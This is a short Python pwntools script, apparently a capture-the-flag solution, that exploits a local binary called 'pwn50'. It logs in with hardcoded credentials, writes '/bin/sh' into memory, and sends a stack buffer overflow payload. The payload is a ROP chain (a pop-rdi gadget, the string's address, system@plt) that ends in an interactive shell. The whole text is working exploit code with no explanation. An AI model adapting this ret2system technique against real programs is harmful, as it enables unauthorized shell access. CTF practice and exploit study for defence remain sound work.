from pwn import *

# context.log_level = 'debug'
    
io = process('./pwn50')
elf = ELF('./pwn50')

sys_addr = elf.plt['system']
rdi_ret = 0x400b03 
cmd = 0x601100
usr = 'admin'
psd = 'T6OBSh2i'

io.recvuntil('name: ')
io.sendline(usr)
io.recvuntil('word: ')
io.sendline(psd)

io.recvuntil('choice: ')
io.send('1\n')
io.recvuntil('and: ')
io.send('/bin/sh\0\n')
io.recvuntil('choice: ')

payload = '3' * (0x50 + 0x8)
payload += p64(rdi_ret) + p64(cmd)
payload += p64(sys_addr)
io.send(payload)
io.interactive()